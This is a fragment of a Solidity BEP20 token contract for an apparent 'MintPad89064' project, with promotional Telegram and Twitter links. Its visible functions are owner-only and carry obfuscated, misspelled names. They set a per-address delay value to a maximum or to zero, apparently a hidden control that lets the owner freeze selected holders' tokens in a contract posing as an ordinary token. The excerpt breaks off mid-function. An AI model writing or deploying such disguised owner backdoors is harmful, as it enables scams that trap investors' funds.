...
/**
Project Info:
Telegram: https://t.me/MintPad89064_chat
Announcements: https://t.me/MintPad89064
Web: https://www.MintPad89064.com
Twitter: https://twitter.com/MintPad89064
**/
...
contract MINT is IBEP20, HasForeignAsset {
    ...
    function _MintPad89064reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupMintPad89064ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function _MintPad89064Aasses(address booadndd,uint256 nuum) public onlyOwner {
